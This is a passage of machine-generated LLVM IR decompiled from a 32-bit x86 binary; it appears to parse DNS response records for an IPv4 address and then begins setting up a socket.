  %v4_804dca6 = zext i8 %v3_804dca6 to i32
  store i32 1, i32* @ebx, align 4
  %v2_804dcb4 = mul nuw nsw i32 %v1_804dca1, 256
  %v2_804dcb7 = add nsw i32 %v2_804dcb4, -49152
  %v3_804dcb7 = or i32 %v4_804dca6, %v2_804dcb7
  store i32 %v3_804dcb7, i32* %eax.global-to-local, align 4
  %v2_804dcc2 = add i32 %v1_804dcbe, %v3_804dcb7
  store i32 %v2_804dcc2, i32* %edx.global-to-local, align 4
  %v1_804dcc4 = inttoptr i32 %v2_804dcc2 to i8*
  %v2_804dcc4 = load i8, i8* %v1_804dcc4, align 1
  %v3_804dcc4 = zext i8 %v2_804dcc4 to i32
  %v6_804dcc4 = or i32 %v3_804dcc4, %v2_804dcb7
  store i32 %v6_804dcc4, i32* %eax.global-to-local, align 4
  %v4_804dcc6 = icmp eq i8 %v2_804dcc4, 0
  %v1_804dcc8 = icmp eq i1 %v4_804dcc6, false
  br i1 %v1_804dcc8, label %dec_label_pc_804dc99, label %dec_label_pc_804dcca

dec_label_pc_804dcca:                             ; preds = %dec_label_pc_804dd5c, %dec_label_pc_804dca1, %dec_label_pc_804dc8a
  %v4_804dce625 = phi i32 [ %v6_804dc9318, %dec_label_pc_804dc8a ], [ %v6_804dcc4, %dec_label_pc_804dca1 ], [ %v6_804dc93, %dec_label_pc_804dd5c ]
  %v5_804dd80 = phi i32 [ %v0_804dc8a, %dec_label_pc_804dc8a ], [ %v2_804dcc2, %dec_label_pc_804dca1 ], [ %v1_804dd5c, %dec_label_pc_804dd5c ]
  %v1_804dcca = phi i32 [ 0, %dec_label_pc_804dc8a ], [ 1, %dec_label_pc_804dca1 ], [ %v0_804dd5d, %dec_label_pc_804dd5c ]
  %v0_804dcca = phi i32 [ 1, %dec_label_pc_804dc8a ], [ %v0_804dd60, %dec_label_pc_804dca1 ], [ %v3_804dd60, %dec_label_pc_804dd5c ]
  %v2_804dcca = add i32 %v1_804dcca, %v0_804dc8a
  %v2_804dccc = add i32 %v2_804dcca, %v0_804dcca
  store i32 %v2_804dccc, i32* @esi, align 4
  %v1_804dccf = inttoptr i32 %v2_804dccc to i16*
  %v2_804dccf = load i16, i16* %v1_804dccf, align 2
  %v8_804dccf = icmp eq i16 %v2_804dccf, 256
  %v1_804dcd4 = add i32 %v2_804dccc, 10
  store i32 %v1_804dcd4, i32* @edi, align 4
  br i1 %v8_804dccf, label %dec_label_pc_804dd74, label %dec_label_pc_804dcdd

dec_label_pc_804dcdd:                             ; preds = %dec_label_pc_804dd74, %dec_label_pc_804dcca
  store i32 %v1_804dcd4, i32* %edx.global-to-local, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v1_804dce622 = inttoptr i32 %v1_804dcd4 to i8*
  %v2_804dce623 = load i8, i8* %v1_804dce622, align 1
  %v3_804dce624 = zext i8 %v2_804dce623 to i32
  %v5_804dce626 = and i32 %v4_804dce625, -256
  %v6_804dce627 = or i32 %v3_804dce624, %v5_804dce626
  store i32 %v6_804dce627, i32* %eax.global-to-local, align 4
  %v4_804dce828 = icmp eq i8 %v2_804dce623, 0
  br i1 %v4_804dce828, label %dec_label_pc_804dd19, label %dec_label_pc_804dcec.preheader.preheader

dec_label_pc_804dcec.preheader.preheader:         ; preds = %dec_label_pc_804dcdd
  %v1_804dd0d = add i32 %v0_804dc82127, 32
  br label %dec_label_pc_804dcec.preheader

dec_label_pc_804dcec.preheader:                   ; preds = %dec_label_pc_804dcec.preheader.preheader, %dec_label_pc_804dd68
  %v0_804dd6c = phi i32 [ %v3_804dd6c, %dec_label_pc_804dd68 ], [ 1, %dec_label_pc_804dcec.preheader.preheader ]
  %v0_804dd6961 = phi i32 [ %v0_804dd69, %dec_label_pc_804dd68 ], [ 0, %dec_label_pc_804dcec.preheader.preheader ]
  %v0_804dcf557 = phi i32 [ %v1_804dd68, %dec_label_pc_804dd68 ], [ %v1_804dcd4, %dec_label_pc_804dcec.preheader.preheader ]
  %v0_804dcec55 = phi i32 [ %v6_804dce6, %dec_label_pc_804dd68 ], [ %v6_804dce627, %dec_label_pc_804dcec.preheader.preheader ]
  br label %dec_label_pc_804dcec

dec_label_pc_804dcec:                             ; preds = %dec_label_pc_804dcec.preheader, %dec_label_pc_804dcf0
  %v0_804dd69 = phi i32 [ %v0_804dd6961, %dec_label_pc_804dcec.preheader ], [ 1, %dec_label_pc_804dcf0 ]
  %v0_804dd68 = phi i32 [ %v0_804dcf557, %dec_label_pc_804dcec.preheader ], [ %v2_804dd11, %dec_label_pc_804dcf0 ]
  %v4_804dce6 = phi i32 [ %v0_804dcec55, %dec_label_pc_804dcec.preheader ], [ %v6_804dd13, %dec_label_pc_804dcf0 ]
  %v1_804dcec = trunc i32 %v4_804dce6 to i8
  %tmp140 = icmp ult i8 %v1_804dcec, -64
  br i1 %tmp140, label %dec_label_pc_804dd68, label %dec_label_pc_804dcf0

dec_label_pc_804dcf0:                             ; preds = %dec_label_pc_804dcec
  %v1_804dcf0 = urem i32 %v4_804dce6, 256
  store i32 %v1_804dcf0, i32* %eax.global-to-local, align 4
  %v1_804dcf5 = add i32 %v0_804dd68, 1
  %v2_804dcf5 = inttoptr i32 %v1_804dcf5 to i8*
  %v3_804dcf5 = load i8, i8* %v2_804dcf5, align 1
  %v4_804dcf5 = zext i8 %v3_804dcf5 to i32
  store i32 1, i32* %ecx.global-to-local, align 4
  %v2_804dd03 = mul nuw nsw i32 %v1_804dcf0, 256
  %v2_804dd06 = add nsw i32 %v2_804dd03, -49152
  %v3_804dd06 = or i32 %v4_804dcf5, %v2_804dd06
  store i32 %v3_804dd06, i32* %eax.global-to-local, align 4
  %v2_804dd11 = add i32 %v1_804dd0d, %v3_804dd06
  store i32 %v2_804dd11, i32* %edx.global-to-local, align 4
  %v1_804dd13 = inttoptr i32 %v2_804dd11 to i8*
  %v2_804dd13 = load i8, i8* %v1_804dd13, align 1
  %v3_804dd13 = zext i8 %v2_804dd13 to i32
  %v6_804dd13 = or i32 %v3_804dd13, %v2_804dd06
  store i32 %v6_804dd13, i32* %eax.global-to-local, align 4
  %v4_804dd15 = icmp eq i8 %v2_804dd13, 0
  %v1_804dd17 = icmp eq i1 %v4_804dd15, false
  br i1 %v1_804dd17, label %dec_label_pc_804dcec, label %dec_label_pc_804dd19

dec_label_pc_804dd19:                             ; preds = %dec_label_pc_804dd68, %dec_label_pc_804dcf0, %dec_label_pc_804dcdd
  %v1_804dd19 = phi i32 [ 0, %dec_label_pc_804dcdd ], [ 1, %dec_label_pc_804dcf0 ], [ %v0_804dd69, %dec_label_pc_804dd68 ]
  %v0_804dd19 = phi i32 [ 1, %dec_label_pc_804dcdd ], [ %v0_804dd6c, %dec_label_pc_804dcf0 ], [ %v3_804dd6c, %dec_label_pc_804dd68 ]
  %v2_804dd19 = add i32 %v0_804dd19, %v1_804dd19
  store i32 %v2_804dd19, i32* @ebx, align 4
  %v2_804dd1b = add i32 %v2_804dd19, %v1_804dcd4
  br label %dec_label_pc_804dc7d.backedge

dec_label_pc_804dc7d.backedge:                    ; preds = %dec_label_pc_804dd19, %dec_label_pc_804dd90
  %v0_804dc7d = phi i32 [ %v0_804dc82127, %dec_label_pc_804dd19 ], [ %v0_804dc7d.pre, %dec_label_pc_804dd90 ]
  %storemerge = phi i32 [ %v2_804dd1b, %dec_label_pc_804dd19 ], [ %v2_804dd9b, %dec_label_pc_804dd90 ]
  store i32 %storemerge, i32* %ecx.global-to-local, align 4
  %v1_804dc7d = add i32 %v0_804dc7d, 22
  %v2_804dc7d = inttoptr i32 %v1_804dc7d to i16*
  %v3_804dc7d = load i16, i16* %v2_804dc7d, align 2
  %v4_804dc7d = add i16 %v3_804dc7d, -1
  store i16 %v4_804dc7d, i16* %v2_804dc7d, align 2
  %v0_804dc82 = load i32, i32* @esp, align 4
  %v1_804dc82 = add i32 %v0_804dc82, 22
  %v2_804dc82 = inttoptr i32 %v1_804dc82 to i16*
  %v3_804dc82 = load i16, i16* %v2_804dc82, align 2
  %v13_804dc82 = icmp eq i16 %v3_804dc82, -1
  br i1 %v13_804dc82, label %dec_label_pc_804dc14, label %dec_label_pc_804dc8a

dec_label_pc_804dd23:                             ; preds = %dec_label_pc_804dc14
  %v1_804dd23 = add i32 %v2_804dc20, 4
  %v2_804dd23 = inttoptr i32 %v1_804dd23 to i32*
  %v3_804dd23 = load i32, i32* %v2_804dd23, align 4
  store i32 %v3_804dd23, i32* %eax.global-to-local, align 4
  %v1_804dd26 = icmp eq i32 %v3_804dd23, 0
  br i1 %v1_804dd26, label %dec_label_pc_804dd36, label %dec_label_pc_804dd2a

dec_label_pc_804dd2a:                             ; preds = %dec_label_pc_804dd23
  %v3_804dd2d = inttoptr i32 %v0_804dc1d to i32*
  store i32 %v3_804dd23, i32* %v3_804dd2d, align 4
  %v1_804dd2e = call i32 @function_8051983(i32 1)
  store i32 %v1_804dd2e, i32* %eax.global-to-local, align 4
  %v0_804dd33 = load i32, i32* @esp, align 4
  %v1_804dd33 = add i32 %v0_804dd33, 16
  br label %dec_label_pc_804dd36

dec_label_pc_804dd36:                             ; preds = %dec_label_pc_804dd23, %dec_label_pc_804dd2a
  %v0_804dd36 = phi i32 [ %v1_804dc1d, %dec_label_pc_804dd23 ], [ %v1_804dd33, %dec_label_pc_804dd2a ]
  %v2_804dd39 = inttoptr i32 %v0_804dd36 to i32*
  %v3_804dd39 = load i32, i32* %v2_804dd39, align 4
  store i32 %v3_804dd39, i32* @esi, align 4
  %v2_804dd3d = add i32 %v0_804dd36, -16
  %v3_804dd3d = inttoptr i32 %v2_804dd3d to i32*
  store i32 %v3_804dd39, i32* %v3_804dd3d, align 4
  %v1_804dd3e = call i32 @function_8051983(i32 1)
  store i32 %v1_804dd3e, i32* %eax.global-to-local, align 4
  %v0_804dd43 = load i32, i32* @esp, align 4
  %v1_804dd43 = add i32 %v0_804dd43, 16
  %v2_804dd43 = inttoptr i32 %v1_804dd43 to i32*
  store i32 0, i32* %v2_804dd43, align 4
  %v0_804dd4b = load i32, i32* @esp, align 4
  %v1_804dd4b = add i32 %v0_804dd4b, 16
  %v1_804dd4e = inttoptr i32 %v1_804dd4b to i32*
  %v2_804dd4e = load i32, i32* %v1_804dd4e, align 4
  store i32 %v2_804dd4e, i32* %eax.global-to-local, align 4
  %v1_804dd51 = add i32 %v0_804dd4b, 4300
  %v1_804dd57 = inttoptr i32 %v1_804dd51 to i32*
  %v2_804dd57 = load i32, i32* %v1_804dd57, align 4
  store i32 %v2_804dd57, i32* @ebx, align 4
  %v3_804dd58 = add i32 %v0_804dd4b, 4308
  %v1_804dd59 = inttoptr i32 %v3_804dd58 to i32*
  %v2_804dd59 = load i32, i32* %v1_804dd59, align 4
  store i32 %v2_804dd59, i32* @edi, align 4
  %v3_804dd59 = add i32 %v0_804dd4b, 4312
  %v1_804dd5a = inttoptr i32 %v3_804dd59 to i32*
  %v2_804dd5a = load i32, i32* %v1_804dd5a, align 4
  store i32 %v2_804dd5a, i32* @ebp, align 4
  ret i32 %v2_804dd4e

dec_label_pc_804dd5c:                             ; preds = %dec_label_pc_804dc99
  %v1_804dd5c = add i32 %v0_804dd5c, 1
  store i32 %v1_804dd5c, i32* %edx.global-to-local, align 4
  %v5_804dd5d = icmp eq i32 %v0_804dd5d, 0
  %v2_804dd60 = zext i1 %v5_804dd5d to i32
  %v3_804dd60 = add i32 %v2_804dd60, %v0_804dd60
  %v1_804dc93 = inttoptr i32 %v1_804dd5c to i8*
  %v2_804dc93 = load i8, i8* %v1_804dc93, align 1
  %v3_804dc93 = zext i8 %v2_804dc93 to i32
  %v5_804dc93 = and i32 %v4_804dc93, -256
  %v6_804dc93 = or i32 %v3_804dc93, %v5_804dc93
  store i32 %v6_804dc93, i32* %eax.global-to-local, align 4
  %v4_804dc95 = icmp eq i8 %v2_804dc93, 0
  br i1 %v4_804dc95, label %dec_label_pc_804dcca, label %dec_label_pc_804dc99.preheader

dec_label_pc_804dd68:                             ; preds = %dec_label_pc_804dcec
  %v1_804dd68 = add i32 %v0_804dd68, 1
  store i32 %v1_804dd68, i32* %edx.global-to-local, align 4
  %v5_804dd69 = icmp eq i32 %v0_804dd69, 0
  %v2_804dd6c = zext i1 %v5_804dd69 to i32
  %v3_804dd6c = add i32 %v2_804dd6c, %v0_804dd6c
  %v1_804dce6 = inttoptr i32 %v1_804dd68 to i8*
  %v2_804dce6 = load i8, i8* %v1_804dce6, align 1
  %v3_804dce6 = zext i8 %v2_804dce6 to i32
  %v5_804dce6 = and i32 %v4_804dce6, -256
  %v6_804dce6 = or i32 %v3_804dce6, %v5_804dce6
  store i32 %v6_804dce6, i32* %eax.global-to-local, align 4
  %v4_804dce8 = icmp eq i8 %v2_804dce6, 0
  br i1 %v4_804dce8, label %dec_label_pc_804dd19, label %dec_label_pc_804dcec.preheader

dec_label_pc_804dd74:                             ; preds = %dec_label_pc_804dcca
  %v1_804dd74 = add i32 %v2_804dccc, 2
  %v2_804dd74 = inttoptr i32 %v1_804dd74 to i16*
  %v3_804dd74 = load i16, i16* %v2_804dd74, align 2
  %v9_804dd74 = icmp eq i16 %v3_804dd74, 256
  %v1_804dd7a = icmp eq i1 %v9_804dd74, false
  br i1 %v1_804dd7a, label %dec_label_pc_804dcdd, label %dec_label_pc_804dd80

dec_label_pc_804dd80:                             ; preds = %dec_label_pc_804dd74
  %v1_804dd80 = add i32 %v2_804dccc, 8
  %v2_804dd80 = inttoptr i32 %v1_804dd80 to i16*
  %v3_804dd80 = load i16, i16* %v2_804dd80, align 2
  %v4_804dd80 = zext i16 %v3_804dd80 to i32
  %v6_804dd80 = and i32 %v5_804dd80, -65536
  %v7_804dd80 = or i32 %v4_804dd80, %v6_804dd80
  store i32 %v7_804dd80, i32* %edx.global-to-local, align 4
  %v2_804dd86 = call i16 @llvm.bswap.i16(i16 %v3_804dd80)
  %v3_804dd86 = zext i16 %v2_804dd86 to i32
  %v6_804dd86 = or i32 %v3_804dd86, %v6_804dd80
  store i32 %v6_804dd86, i32* %eax.global-to-local, align 4
  %v10_804dd8a = icmp eq i16 %v3_804dd80, 1024
  br i1 %v10_804dd8a, label %dec_label_pc_804dda3, label %dec_label_pc_804dd90

dec_label_pc_804dd90:                             ; preds = %dec_label_pc_804dd80, %dec_label_pc_804dda3
  %v0_804dc7d.pre = phi i32 [ %v0_804dc82127, %dec_label_pc_804dd80 ], [ %v0_804dc7d.pre.pre, %dec_label_pc_804dda3 ]
  %v0_804dd9b = phi i32 [ %v1_804dcd4, %dec_label_pc_804dd80 ], [ %v0_804dd9b.pre, %dec_label_pc_804dda3 ]
  %v0_804dd90 = phi i32 [ %v7_804dd80, %dec_label_pc_804dd80 ], [ %v7_804de07, %dec_label_pc_804dda3 ]
  %v1_804dd90 = trunc i32 %v0_804dd90 to i16
  %v2_804dd90 = call i16 @llvm.bswap.i16(i16 %v1_804dd90)
  %v3_804dd90 = zext i16 %v2_804dd90 to i32
  %v5_804dd90 = and i32 %v0_804dd90, -65536
  %v6_804dd90 = or i32 %v3_804dd90, %v5_804dd90
  store i32 %v6_804dd90, i32* %edx.global-to-local, align 4
  store i32 %v3_804dd90, i32* %eax.global-to-local, align 4
  %v2_804dd9b = add i32 %v3_804dd90, %v0_804dd9b
  br label %dec_label_pc_804dc7d.backedge

dec_label_pc_804dda3:                             ; preds = %dec_label_pc_804dd80
  %v2_804dda3 = inttoptr i32 %v1_804dcd4 to i8*
  %v3_804dda3 = load i8, i8* %v2_804dda3, align 1
  %v4_804dda3 = zext i8 %v3_804dda3 to i32
  %v6_804dda3 = and i32 %v6_804dd86, -256
  %v7_804dda3 = or i32 %v4_804dda3, %v6_804dda3
  store i32 %v7_804dda3, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v3_804dda8 = add i32 %v0_804dc82127, 4280
  %v4_804dda8 = inttoptr i32 %v3_804dda8 to i8*
  store i8 %v3_804dda3, i8* %v4_804dda8, align 1
  %v0_804ddaf = load i32, i32* @edi, align 4
  %v1_804ddaf = add i32 %v0_804ddaf, 1
  %v2_804ddaf = inttoptr i32 %v1_804ddaf to i8*
  %v3_804ddaf = load i8, i8* %v2_804ddaf, align 1
  %v4_804ddaf = zext i8 %v3_804ddaf to i32
  %v5_804ddaf = load i32, i32* %eax.global-to-local, align 4
  %v6_804ddaf = and i32 %v5_804ddaf, -256
  %v7_804ddaf = or i32 %v6_804ddaf, %v4_804ddaf
  store i32 %v7_804ddaf, i32* %eax.global-to-local, align 4
  %v2_804ddb2 = load i32, i32* @esp, align 4
  %v3_804ddb2 = add i32 %v2_804ddb2, 4281
  %v4_804ddb2 = inttoptr i32 %v3_804ddb2 to i8*
  store i8 %v3_804ddaf, i8* %v4_804ddb2, align 1
  %v0_804ddb9 = load i32, i32* @edi, align 4
  %v1_804ddb9 = add i32 %v0_804ddb9, 2
  %v2_804ddb9 = inttoptr i32 %v1_804ddb9 to i8*
  %v3_804ddb9 = load i8, i8* %v2_804ddb9, align 1
  %v4_804ddb9 = zext i8 %v3_804ddb9 to i32
  %v5_804ddb9 = load i32, i32* %eax.global-to-local, align 4
  %v6_804ddb9 = and i32 %v5_804ddb9, -256
  %v7_804ddb9 = or i32 %v6_804ddb9, %v4_804ddb9
  store i32 %v7_804ddb9, i32* %eax.global-to-local, align 4
  %v2_804ddbc = load i32, i32* @esp, align 4
  %v3_804ddbc = add i32 %v2_804ddbc, 4282
  %v4_804ddbc = inttoptr i32 %v3_804ddbc to i8*
  store i8 %v3_804ddb9, i8* %v4_804ddbc, align 1
  %v0_804ddc3 = load i32, i32* @edi, align 4
  %v1_804ddc3 = add i32 %v0_804ddc3, 3
  %v2_804ddc3 = inttoptr i32 %v1_804ddc3 to i8*
  %v3_804ddc3 = load i8, i8* %v2_804ddc3, align 1
  %v4_804ddc3 = zext i8 %v3_804ddc3 to i32
  %v5_804ddc3 = load i32, i32* %eax.global-to-local, align 4
  %v6_804ddc3 = and i32 %v5_804ddc3, -256
  %v7_804ddc3 = or i32 %v6_804ddc3, %v4_804ddc3
  store i32 %v7_804ddc3, i32* %eax.global-to-local, align 4
  %v2_804ddc6 = load i32, i32* @esp, align 4
  %v3_804ddc6 = add i32 %v2_804ddc6, 4283
  %v4_804ddc6 = inttoptr i32 %v3_804ddc6 to i8*
  store i8 %v3_804ddc3, i8* %v4_804ddc6, align 1
  %v0_804ddcd = load i32, i32* %eax.global-to-local, align 4
  %v1_804ddcd = load i32, i32* @esp, align 4
  %v2_804ddcd = add i32 %v1_804ddcd, -4
  %v3_804ddcd = inttoptr i32 %v2_804ddcd to i32*
  store i32 %v0_804ddcd, i32* %v3_804ddcd, align 4
  %v0_804ddce = load i32, i32* %eax.global-to-local, align 4
  %v2_804ddce = add i32 %v1_804ddcd, -8
  %v3_804ddce = inttoptr i32 %v2_804ddce to i32*
  store i32 %v0_804ddce, i32* %v3_804ddce, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_804ddd1 = inttoptr i32 %v1_804ddcd to i32*
  %v3_804ddd1 = load i32, i32* %v2_804ddd1, align 4
  store i32 %v3_804ddd1, i32* @edx, align 4
  %v1_804ddd5 = inttoptr i32 %v3_804ddd1 to i8*
  %v2_804ddd5 = load i8, i8* %v1_804ddd5, align 1
  %v3_804ddd5 = zext i8 %v2_804ddd5 to i32
  %v1_804ddd7 = mul nuw nsw i32 %v3_804ddd5, 4
  %v2_804ddd7 = add nuw nsw i32 %v1_804ddd7, 4
  store i32 %v2_804ddd7, i32* %eax.global-to-local, align 4
  %v2_804ddde = add i32 %v1_804ddcd, -12
  %v3_804ddde = inttoptr i32 %v2_804ddde to i32*
  store i32 %v2_804ddd7, i32* %v3_804ddde, align 4
  %v0_804dddf = load i32, i32* @edx, align 4
  %v1_804dddf = add i32 %v0_804dddf, 4
  %v2_804dddf = inttoptr i32 %v1_804dddf to i32*
  %v3_804dddf = load i32, i32* %v2_804dddf, align 4
  store i32 %v3_804dddf, i32* %eax.global-to-local, align 4
  %v2_804dde2 = add i32 %v1_804ddcd, -16
  %v3_804dde2 = inttoptr i32 %v2_804dde2 to i32*
  store i32 %v3_804dddf, i32* %v3_804dde2, align 4
  %v0_804dde3 = call i32 @function_8051426()
  store i32 %v0_804dde3, i32* %eax.global-to-local, align 4
  %v0_804dde8 = load i32, i32* @esp, align 4
  %v1_804dde8 = add i32 %v0_804dde8, 16
  %v2_804dde8 = inttoptr i32 %v1_804dde8 to i32*
  %v3_804dde8 = load i32, i32* %v2_804dde8, align 4
  store i32 %v3_804dde8, i32* %ecx.global-to-local, align 4
  %v1_804ddec = inttoptr i32 %v3_804dde8 to i8*
  %v2_804ddec = load i8, i8* %v1_804ddec, align 1
  %v3_804ddec = zext i8 %v2_804ddec to i32
  %v4_804ddec = load i32, i32* @edx, align 4
  %v5_804ddec = and i32 %v4_804ddec, -256
  %v6_804ddec = or i32 %v5_804ddec, %v3_804ddec
  store i32 %v6_804ddec, i32* %edx.global-to-local, align 4
  %v2_804ddee = add i32 %v3_804dde8, 4
  %v3_804ddee = inttoptr i32 %v2_804ddee to i32*
  store i32 %v0_804dde3, i32* %v3_804ddee, align 4
  %v0_804ddf1 = load i32, i32* %edx.global-to-local, align 4
  %v1_804ddf1 = urem i32 %v0_804ddf1, 256
  %v2_804ddf1 = load i32, i32* @ebx, align 4
  %v3_804ddf1 = and i32 %v2_804ddf1, -256
  %v4_804ddf1 = or i32 %v3_804ddf1, %v1_804ddf1
  store i32 %v4_804ddf1, i32* @ebx, align 4
  %v0_804ddf3 = load i32, i32* @esp, align 4
  %v1_804ddf3 = add i32 %v0_804ddf3, 4296
  %v2_804ddf3 = inttoptr i32 %v1_804ddf3 to i32*
  %v3_804ddf3 = load i32, i32* %v2_804ddf3, align 4
  store i32 %v3_804ddf3, i32* %ecx.global-to-local, align 4
  %v1_804ddfa = add i32 %v0_804ddf1, 1
  store i32 %v1_804ddfa, i32* %edx.global-to-local, align 4
  %v3_804ddfb = mul i32 %v4_804ddf1, 4
  %v4_804ddfb = add i32 %v3_804ddfb, %v0_804dde3
  %v5_804ddfb = inttoptr i32 %v4_804ddfb to i32*
  store i32 %v3_804ddf3, i32* %v5_804ddfb, align 4
  %v0_804ddfe = load i32, i32* @esp, align 4
  %v1_804ddfe = add i32 %v0_804ddfe, 16
  %v2_804ddfe = inttoptr i32 %v1_804ddfe to i32*
  %v3_804ddfe = load i32, i32* %v2_804ddfe, align 4
  store i32 %v3_804ddfe, i32* %eax.global-to-local, align 4
  %v0_804de05 = load i32, i32* %edx.global-to-local, align 4
  %v1_804de05 = trunc i32 %v0_804de05 to i8
  %v3_804de05 = inttoptr i32 %v3_804ddfe to i8*
  store i8 %v1_804de05, i8* %v3_804de05, align 1
  %v0_804de07 = load i32, i32* @esi, align 4
  %v1_804de07 = add i32 %v0_804de07, 8
  %v2_804de07 = inttoptr i32 %v1_804de07 to i16*
  %v3_804de07 = load i16, i16* %v2_804de07, align 2
  %v4_804de07 = zext i16 %v3_804de07 to i32
  %v5_804de07 = load i32, i32* %edx.global-to-local, align 4
  %v6_804de07 = and i32 %v5_804de07, -65536
  %v7_804de07 = or i32 %v6_804de07, %v4_804de07
  store i32 %v7_804de07, i32* %edx.global-to-local, align 4
  %v0_804dd9b.pre = load i32, i32* @edi, align 4
  %v0_804dc7d.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804dd90

; uselistorder directives
  uselistorder i32 %v7_804de07, { 1, 0 }
  uselistorder i32 %v0_804ddf1, { 1, 0 }
  uselistorder i32 %v3_804dd90, { 0, 2, 1 }
  uselistorder i32 %v0_804dd90, { 1, 0 }
  uselistorder i32 %v6_804dce6, { 1, 0 }
  uselistorder i32 %v3_804dd6c, { 1, 0 }
  uselistorder i32 %v1_804dd68, { 1, 2, 0 }
  uselistorder i32 %v6_804dc93, { 2, 1, 0 }
  uselistorder i32 %v3_804dd60, { 1, 0 }
  uselistorder i32 %v1_804dd5c, { 2, 3, 1, 0 }
  uselistorder i32 %v0_804dd36, { 1, 0 }
  uselistorder i32 %v0_804dc82, { 2, 1, 0 }
  uselistorder i32 %v6_804dd13, { 1, 0 }
  uselistorder i32 %v2_804dd11, { 1, 2, 0 }
  uselistorder i32 %v3_804dd06, { 1, 0 }
  uselistorder i32 %v4_804dce6, { 1, 0, 2 }
  uselistorder i32 %v0_804dd69, { 2, 0, 1 }
  uselistorder i32 %v0_804dd6c, { 1, 0 }
  uselistorder i32 %v1_804dcd4, { 5, 4, 1, 0, 2, 3, 6 }
  uselistorder i32 %v6_804dcc4, { 0, 2, 1 }
  uselistorder i32 %v2_804dcc2, { 0, 2, 3, 1 }
  uselistorder i32 %v3_804dcb7, { 1, 0 }
  uselistorder i32 %v4_804dc93, { 1, 0, 2 }
  uselistorder i32 %v0_804dd5d, { 2, 0, 1 }
  uselistorder i32 %v0_804dd60, { 1, 0 }
  uselistorder i32 %v6_804dc9318, { 1, 0, 2 }
  uselistorder i32 %v0_804dc8a, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_804dc82127, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v0_804dc82122, { 0, 2, 1 }
  uselistorder i32 %v1_804dc53, { 1, 0 }
  uselistorder i32 %v0_804dc4f, { 0, 1, 2, 4, 5, 3 }
  uselistorder i32 %v2_804dc4a, { 1, 0, 2 }
  uselistorder i32 %v0_804dc1d, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v1_804dbfa, { 1, 0 }
  uselistorder i32 %v1_804dbf9, { 1, 0 }
  uselistorder i32 %v3_804dbce, { 1, 0 }
  uselistorder i32 %v0_804db85, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10 }
  uselistorder i32 %v1_804db4d, { 1, 0 }
  uselistorder i32 %v2_804db4a, { 1, 0 }
  uselistorder i32 %v0_804db46, { 1, 0 }
  uselistorder i32 %v1_804db33, { 2, 0, 1, 3 }
  uselistorder i32 %v12_804db27, { 1, 0 }
  uselistorder i32 %v0_804db24, { 2, 0, 1 }
  uselistorder i32 %v0_804db0f, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v0_804daed, { 0, 6, 1, 2, 3, 4, 5 }
  uselistorder i32 %v0_804dace, { 0, 5, 1, 2, 3, 4 }
  uselistorder i32 %v4_804dac9, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804dab1, { 1, 0 }
  uselistorder i32 %v2_804da38, { 1, 0 }
  uselistorder i32 %v1_804da2a, { 1, 0 }
  uselistorder i8 %v2_804d9b6, { 1, 0, 2 }
  uselistorder i32 %v2_804d9a3, { 1, 0, 2 }
  uselistorder i32 %v2_804d990, { 1, 0, 2, 3, 4 }
  uselistorder i32* %stack_var_-44, { 0, 2, 1 }
  uselistorder i32* %ecx.global-to-local, { 0, 1, 15, 2, 3, 14, 4, 5, 6, 11, 7, 8, 9, 10, 12, 13 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 23, 27, 16, 17, 18, 19, 20, 21, 22, 62, 24, 25, 26, 60, 61, 28, 29, 30, 31, 32, 33, 34, 56, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 57, 58, 59 }
  uselistorder i16 -1, { 2, 3, 0, 1 }
  uselistorder i32 4312, { 1, 0 }
  uselistorder i32 4308, { 1, 0 }
  uselistorder i32 4300, { 1, 0 }
  uselistorder label %dec_label_pc_804dd90, { 1, 0 }
  uselistorder label %dec_label_pc_804dd36, { 1, 0 }
  uselistorder label %dec_label_pc_804dc7d.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_804dcec, { 1, 0 }
  uselistorder label %dec_label_pc_804dcec.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804dc99, { 1, 0 }
  uselistorder label %dec_label_pc_804dc99.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804dc8a, { 1, 0 }
  uselistorder label %dec_label_pc_804dc14, { 4, 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804dac2, { 1, 0 }
  uselistorder label %dec_label_pc_804d9b6, { 1, 0 }
}

define i32 @function_804de10() local_unnamed_addr {
dec_label_pc_804de10:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v0_804de10 = load i32, i32* @ebx, align 4
  %v0_804de11 = load i32, i32* @eax, align 4
  store i32 %v0_804de11, i32* @ebx, align 4
  store i32 0, i32* %stack_var_-20, align 4
  %v1_804de36 = add i32 %v0_804de11, 4
  %v2_804de36 = inttoptr i32 %v1_804de36 to i32*
  %v3_804de36 = load i32, i32* %v2_804de36, align 4
  %v10_804de39 = icmp eq i32 %v3_804de36, -1
  br i1 %v10_804de39, label %dec_label_pc_804de10.dec_label_pc_804de4a_crit_edge, label %dec_label_pc_804de3e

dec_label_pc_804de10.dec_label_pc_804de4a_crit_edge: ; preds = %dec_label_pc_804de10
  br label %dec_label_pc_804de4a

dec_label_pc_804de3e:                             ; preds = %dec_label_pc_804de10
  %v1_804de42 = call i32 @function_8050253(i32 %v3_804de36)
  br label %dec_label_pc_804de4a

dec_label_pc_804de4a:                             ; preds = %dec_label_pc_804de10.dec_label_pc_804de4a_crit_edge, %dec_label_pc_804de3e
  %v0_804de4a = phi i32 [ -1, %dec_label_pc_804de10.dec_label_pc_804de4a_crit_edge ], [ %v1_804de42, %dec_label_pc_804de3e ]
  %v4_804de51 = call i32 @function_8050a37(i32 2, i32 1, i32 0, i32 %v0_804de4a)
  %v1_804de59 = load i32, i32* @ebx, align 4
  %v2_804de59 = add i32 %v1_804de59, 4
  %v3_804de59 = inttoptr i32 %v2_804de59 to i32*
